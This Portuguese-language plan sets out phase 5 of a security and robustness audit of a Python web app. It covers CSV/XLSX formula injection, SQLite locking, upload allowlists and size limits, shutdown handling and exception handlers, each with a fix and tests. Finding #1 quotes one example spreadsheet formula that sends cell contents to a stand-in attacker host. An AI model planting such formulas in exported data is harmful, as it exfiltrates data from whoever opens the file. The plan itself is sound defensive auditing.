# ⚙️ Plano de Execução — ETAPA 5: Shared Core, Database Bootstrap & Exportadores

> **Escopo:** `app/bootstrap/` + `app/shared/core/` + `app/shared/exporter.py`
> **Relatório a gerar:** `docs/backlog/Fable5/relatorio_core_bootstrap.md`
> **Referência de processo:** `docs/backlog/Fable5/Planejamento_revisao.md`
> **Template de auditoria:** `docs/backlog/Fable5/prompt.md`

---

## 📁 Arquivos-Alvo (1.173 linhas)

| Arquivo | Linhas | Prioridade |
|---|---:|:---:|
| `app/shared/core/storage.py` | 155 | 🔴 Alta |
| `app/bootstrap/dependencies.py` | 160 | 🔴 Alta (compartilhado com Etapa 4) |
| `app/bootstrap/tasks.py` | 139 | 🔴 Alta |
| `app/bootstrap/main.py` | 133 | 🟡 Média |
| `app/shared/core/enums.py` | 95 | 🟡 Média |
| `app/shared/core/file_validators.py` | 90 | 🔴 Alta |
| `app/bootstrap/database.py` | 88 | 🔴 Alta |
| `app/shared/exporter.py` | 74 | 🔴 Alta |
| `app/shared/core/exceptions.py` | 71 | 🟡 Média |
| `app/bootstrap/events.py` | 58 | 🟡 Média |
| `app/bootstrap/seed.py` / `helpers.py` / `limiter.py` / `db_utils.py` | 46/27/10/23 | 🟢 Baixa |

> ⚠️ **Correção de premissa do plano original:** o `Planejamento_revisao.md` lista como foco
> *"garantia de PRAGMAs de performance no SQLite (WAL mode, synchronous=NORMAL)"*. **Isso já está feito** —
> `database.py:52-54` já aplica `foreign_keys=ON`, `journal_mode=WAL` e `synchronous=NORMAL`.
> A lacuna real é outra: **falta `busy_timeout`** (item #2), que é justamente o que dói agora que as
> Etapas 1-2 introduziram escritores concorrentes em background.

---

## 🔎 Achados Pré-Verificados

**CONFIRMADO** = verificado nesta sessão; **A VERIFICAR** = forte indício, exige teste na execução.

### 🔴 Críticos

---

#### 1. CSV/Formula Injection nos exportadores — **CONFIRMADO**
- **Tipo:** Vulnerabilidade
- **Evidência (`app/shared/exporter.py:22`):**
  ```python
  writer.writerow([str(item) if item is not None else "" for item in row])
  ```
  E o equivalente em XLSX (`exporter.py:55-56`). Nenhum tratamento de células iniciadas por
  `=`, `+`, `-`, `@`, TAB ou CR.
- **Vetor real e concreto:** os dados exportados vêm de **campos livres preenchidos por usuários** —
  `descricao` de pane, `observacoes` de inspeção, `titulo` de tarefa. Um usuário grava
  `=HYPERLINK("http://attacker/?d="&A1,"clique")` numa descrição; um encarregado exporta o relatório e
  abre no Excel; a fórmula executa **no contexto da máquina dele**, exfiltrando o conteúdo da planilha.
- **Alcance:** `gerar_csv`/`gerar_xlsx` são usados por múltiplos routers
  (`inspecoes/router.py:19` importa ambos; a Etapa 1 corrigiu o endpoint `/inventario/export`).
  Uma correção no `exporter.py` protege **todos** os consumidores de uma vez — alto retorno.
- **Correção:** prefixar com apóstrofo (`'`) toda célula cujo primeiro caractere esteja em
  `= + - @ \t \r`. Aplicar nas **duas** funções, num helper único `_neutralizar_formula(valor)`.
- **Cuidado:** não quebrar valores numéricos legítimos negativos (`-5`). Decidir se a neutralização
  ocorre só em `str` ou se números são convertidos antes — **definir e testar explicitamente**.

---

#### 2. SQLite sem `busy_timeout` com escritores concorrentes — **A VERIFICAR (alta confiança)**
- **Tipo:** Concorrência
- **Evidência (`app/bootstrap/database.py:47-55`):** os PRAGMAs registrados no listener de `connect` são
  `foreign_keys`, `journal_mode=WAL` e `synchronous=NORMAL`. **Não há `busy_timeout`.**
- **Por que virou risco agora:** as Etapas 1-2 adicionaram escritores de fundo permanentes —
  `token_cleanup_task` (de hora em hora, `tasks.py:102`) e `anexos_travados_cleanup_task`
  (**a cada 15 min**, `tasks.py:130`, novo na Etapa 2). Some-se o backup R2 orientado a evento
  (`events.py:35`). Em WAL, leitores não bloqueiam escritores, mas **dois escritores simultâneos**
  disputam a lock; sem `busy_timeout` o SQLite falha **imediatamente** com
  `database is locked` em vez de aguardar.
- **Risco & Impacto:** requisição de usuário falhando com 500 aleatório quando coincide com o job de
  15 minutos. Intermitente, difícil de reproduzir, e a janela de colisão cresce com o volume de anexos.
- **Correção:** `cursor.execute("PRAGMA busy_timeout=5000")` no listener existente.
- **Como verificar:** teste de concorrência com duas sessões escrevendo simultaneamente; confirmar
  `OperationalError: database is locked` antes do fix e ausência depois. **Confirmar experimentalmente
  antes de classificar como crítico no relatório** — o impacto depende do volume real de escrita.

---

#### 3. Allowlist de upload divergente em 4 lugares — **CONFIRMADO**
- **Tipo:** Vulnerabilidade / Arquitetura
- **Evidência — quatro fontes de verdade que já divergem:**

  | Local | Extensões aceitas |
  |---|---|
  | `app/shared/core/file_validators.py:18-22` | `.jpg .jpeg .png .pdf` |
  | `app/shared/core/storage.py:51` (Local) | `.jpg .jpeg .png .pdf` **`.doc` `.docx`** |
  | `app/shared/core/storage.py:107` (R2) | `.jpg .jpeg .png .pdf` **`.doc` `.docx`** |
  | `app/modules/panes/service.py` (`_EXTENSAO_MIME_MAP`, criado na Etapa 2) | verificar na execução |

- **Risco & Impacto:** `file_validators` valida **magic bytes** e rejeita `.doc/.docx`; o storage os
  aceita. Qualquer caminho de upload que chame o storage **sem** passar por `validate_file_upload`
  aceita Office sem validação de conteúdo — inconsistência que é uma bomba-relógio de segurança.
  A lista está literalmente duplicada entre as duas classes de storage (L51 e L107).
- **Correção:** fonte única em `file_validators.py` (ex.: `EXTENSOES_PERMITIDAS`), importada pelo storage
  e por panes. Antes de unificar, **decidir explicitamente**: `.doc/.docx` é caso de uso legítimo?
  Se sim, adicionar magic bytes correspondentes ao validador; se não, remover do storage.

---

#### 4. Ausência de validação de tamanho de upload — **CONFIRMADO (pendência herdada da Etapa 2)**
- **Tipo:** Vulnerabilidade (DoS)
- **Evidência:** `file_validators.validate_file_upload` valida nome, extensão e magic bytes —
  **nunca o tamanho**. O storage recebe `file_content: bytes` **já materializado em memória**
  (`storage.py:45` e `storage.py:101`).
- **Rastreabilidade:** é o **item #1 do `relatorio_panes_service.md`**, explicitamente registrado como
  *não tratado* na Etapa 2 (*"validação de tamanho antes de carregar tudo em memória"*).
  `app/shared/core/` é o domicílio correto da correção — **esta etapa é onde a dívida fecha.**
- **Risco:** upload de arquivo grande carrega tudo em RAM antes de qualquer rejeição.
- **Correção:** limite em `settings` (ex.: `max_upload_size_mb`), validado a partir do
  `Content-Length` **e** durante a leitura em chunks (o header é controlado pelo cliente e não é confiável sozinho).

---

### 🟡 Média

#### 5. Escrita de arquivo bloqueia o event loop — **CONFIRMADO**
- **Evidência (`app/shared/core/storage.py:59-60`):**
  ```python
  with open(file_path, "wb") as f:
      f.write(file_content)
  ```
  Dentro de um método `async def`. O próprio comentário admite: *"pode bloquear levemente event loop"*.
- **Incoerência interna:** a classe R2 ao lado faz certo, com `_run_in_executor` (`storage.py:96-99`).
  Só a local bloqueia.
- **Correção:** `await asyncio.to_thread(...)` — padrão já adotado na Etapa 2 em
  `processar_imagem_background`.

#### 6. Cancelamento de tasks de background sem espera no shutdown — **CONFIRMADO**
- **Evidência (`app/bootstrap/events.py:48-58`):**
  ```python
  cleanup_task.cancel()
  anexos_cleanup_task.cancel()
  ...
  await dispose_engine()
  ```
  `.cancel()` apenas **sinaliza**; não há `await` das tasks. `dispose_engine()` pode executar enquanto
  uma task está no meio de uma query.
- **Risco:** erros ruidosos no shutdown e, no pior caso, transação interrompida no meio.
- **Correção:** `await asyncio.gather(*tasks, return_exceptions=True)` após os `cancel()`.
  As tasks já tratam `CancelledError` (`tasks.py:124-125`), então a espera é segura.

#### 7. Exportadores materializam tudo em memória — **CONFIRMADO**
- **Evidência:** `gerar_csv` acumula em `StringIO` e devolve `str` completa (`exporter.py:23`);
  `gerar_xlsx` monta o `Workbook` inteiro e devolve `bytes` (`exporter.py:72-74`). O ajuste de largura
  de coluna (`exporter.py:63-70`) **percorre todas as células de novo** — segunda passada completa.
- **Risco:** pico de memória proporcional ao volume exportado; é o foco declarado do plano-mãe para esta etapa.
- **Correção:** `openpyxl.Workbook(write_only=True)` e largura calculada em passada única durante a
  escrita. Para CSV, avaliar `StreamingResponse` com generator.
- **Ordem sugerida:** fazer **depois** do item #1 — a neutralização de fórmula altera as mesmas linhas.

#### 8. Handler global de exceções com lista de prefixos hardcoded — **CONFIRMADO**
- **Evidência (`app/shared/core/exceptions.py:62`):**
  ```python
  api_prefixes = ["/auth/", "/efetivo/", "/aeronaves/", "/equipamentos/", "/vencimentos/", "/panes/", "/inspecoes/", "/dashboard/"]
  ```
- **Bug latente confirmado:** `main.py:118` registra o calendário em **`/api/v1/calendario`** — prefixo
  **ausente** da lista. Um 401/403 nessa API, vindo de um cliente que aceite `text/html`, retorna um
  **redirect 307 para `/login`** em vez de JSON 401 — o frontend recebe HTML onde espera JSON.
- **Correção:** derivar a lista dos routers registrados, ou inverter a lógica (redirecionar apenas as
  rotas de página, que são a exceção conhecida, e não enumerar todas as de API).

#### 9. Nenhum handler para exceções não tratadas — **CONFIRMADO**
- **Evidência (`app/shared/core/exceptions.py:42-71`):** `setup_exception_handlers` registra apenas
  `RateLimitExceeded` e `HTTPException`. **Não há handler para `Exception`.**
- **Risco:** uma exceção inesperada (como o `AttributeError` do item #1 da Etapa 3) sobe até o Starlette
  e, com `app_debug=True`, pode expor **stack trace completo** ao cliente. O plano-mãe pede exatamente
  *"centralização dos Exception Handlers globais"* e *"prevenção de vazamento de informações técnicas"*.
- **Correção:** handler genérico de `Exception` → log com traceback no servidor + JSON 500 genérico ao cliente.

#### 10. `lru_cache` na fábrica de storage — **CONFIRMADO**
- **Evidência (`app/shared/core/storage.py:149-155`):** `@functools.lru_cache(maxsize=1)` congela a
  instância no primeiro uso. Em teste, trocar `storage_backend` nas settings não tem efeito.
- **Correção:** manter o cache (é desejável), mas expor `get_storage_service.cache_clear()` nas fixtures.

### 🟢 Baixa

#### 11. Limpezas — **CONFIRMADO**
- **`raise ValueError`**: 5 em `storage.py` (L48, 53, 83, 104, 109) e 3 em `bootstrap/config/__init__.py`
  → `domain_exc` onde fizer sentido (atenção: storage é infraestrutura, `ValueError` pode ser aceitável —
  **decidir e documentar**, não migrar por reflexo).
- **Duplicação de validação de path traversal** em `storage.py:47` e `storage.py:103` (idêntica) e
  também em `file_validators.py:43` → unificar no validador.
- **`get_url` local expõe caminho absoluto do servidor** (`storage.py:64-66`) — verificar se chega ao cliente.
- **Numeração de comentários quebrada** em `events.py` (1, 2, **4**, 5 — falta o 3).
- **`os.makedirs` em tempo de import** (`main.py:128`) e `app = create_app()` no nível do módulo (L133)
  — efeito colateral no import; dificulta testar múltiplas configurações.
- **CORS com fallback silencioso** (`main.py:97-98`): `"*"` vira lista fixa de `localhost` sem log.
  Em produção com `allowed_origins="*"` mal configurado, o CORS quebra sem aviso.
- **`app/shared/core/helpers.py` e `db_utils.py`** — revisar coesão; `db_utils.py` foi criado na Etapa 1
  e tem apenas `escape_like`.
- **`enums.py`**: verificar se todos os enums de status têm colunas `String` correspondentes —
  a migration `String → sqlalchemy.Enum` é pendência consciente registrada na Etapa 1.

---

## 🗺️ Plano de Ação em Fases

### Fase 0 — Baseline
1. `.venv\Scripts\pytest` → 261/261.
2. Cobertura atual do escopo: `tests/test_exporter.py` (**2 testes**), `tests/unit/test_r2_manager.py` (11),
   `tests/architecture/` (8). O exportador — alvo do achado mais grave — tem **2 testes**.
3. Registrar baseline de memória/tempo de uma exportação grande (item #7).

### Fase 1 — Segurança de dados (maior retorno, menor acoplamento)
- Item **#1** (CSV/formula injection) — corrige todos os consumidores de uma vez.
- Item **#3** (unificação de allowlist), **#4** (limite de tamanho).
- ✅ *Checkpoint.*

### Fase 2 — Robustez de infraestrutura
- Item **#2** (`busy_timeout` — **verificar experimentalmente primeiro**), **#5** (`to_thread`), **#6** (shutdown).
- ✅ *Checkpoint.*

### Fase 3 — Contrato de erro global
- Itens **#8** (prefixo do calendário), **#9** (handler de `Exception`).
- ⚠️ Alterar o handler global afeta **todas** as respostas de erro da aplicação — rodar a suíte inteira,
  com atenção a `tests/security/`.
- ✅ *Checkpoint.*

### Fase 4 — Performance de exportação e limpezas
- Itens **#7**, **#10**, **#11**.

### Fase 5 — Consolidação e fechamento do FABLE 5
- `relatorio_core_bootstrap.md` no formato do `prompt.md`.
- Atualizar `Planejamento_revisao.md` (matriz + seção da Etapa 5) e **corrigir a premissa dos PRAGMAs**.
- **Encerramento do plano de 5 etapas:** consolidar num apanhado final todas as *pendências conscientes*
  acumuladas nas Etapas 1-5 (fila persistente tipo Celery/ARQ para anexos; migration `String → Enum`;
  paginação sem suporte no frontend; ferramentas de CI — mypy, import-linter, ruff D — não configuradas;
  `with_for_update` no-op em SQLite). Decidir: viram backlog novo ou ficam registradas como aceitas.
- Commit no padrão das Etapas 1-2.

---

## 🧪 Estratégia de Testes

| Arquivo | Cobre |
|---|---|
| `tests/security/test_exporter_injection.py` | #1 — células com `=`, `+`, `-`, `@`, TAB, CR em CSV **e** XLSX; negativos numéricos preservados |
| `tests/unit/test_storage_hardening.py` | #3, #4, #5, #10 — allowlist única, limite de tamanho, não-bloqueio do loop |
| `tests/unit/test_bootstrap_resiliencia.py` | #2, #6, #8, #9 — concorrência SQLite, shutdown limpo, 401 JSON em `/api/v1/calendario`, 500 sem stack trace |

**Meta:** suíte 100% verde. Os itens #1 e #2 exigem teste que **falhe antes** da correção — sem isso não
há prova de que o defeito existia.

---

## ⚠️ Riscos Conhecidos desta Etapa

1. **Esta é a etapa de maior raio de alcance.** `exceptions.py`, `database.py` e `dependencies.py` são
   usados por **todos** os módulos — uma regressão aqui atinge os 261 testes de uma vez. Fases curtas,
   commit por fase.
2. **`dependencies.py` é compartilhado com a Etapa 4.** Se a Etapa 4 já tiver sido executada, revisar o
   que mudou antes de tocar no arquivo, para não desfazer a correção de revogação de família.
3. **Item #1 pode alterar a saída de exportações existentes** — o apóstrofo de neutralização é visível
   em alguns leitores de CSV. Confirmar que o comportamento é aceitável para o usuário final.
4. **Item #2 é uma hipótese de alta confiança, não um fato observado.** Reproduzir a contenção antes de
   classificar a severidade no relatório.
5. **Não migrar `ValueError` → `domain_exc` mecanicamente em `storage.py`** — é camada de infraestrutura,
   não de domínio. Decidir com critério e registrar a decisão.

---

## ✅ Definition of Done

- [ ] Achados 🔴 corrigidos ou adiados **com justificativa** no relatório.
- [ ] Itens #1 e #2 com teste que falha antes da correção e passa depois.
- [ ] `.venv\Scripts\pytest` = 100% verde, sem skips novos.
- [ ] `relatorio_core_bootstrap.md` gerado no formato do `prompt.md`.
- [ ] `Planejamento_revisao.md` atualizado + premissa dos PRAGMAs corrigida.
- [ ] **Apanhado final das pendências conscientes das 5 etapas** consolidado.
- [ ] Nenhuma resposta de erro expondo stack trace ou caminho absoluto do servidor.

---
*Plano de execução da Etapa 5 — FABLE 5 / SAA29. Achados levantados em 02/08/2026.*
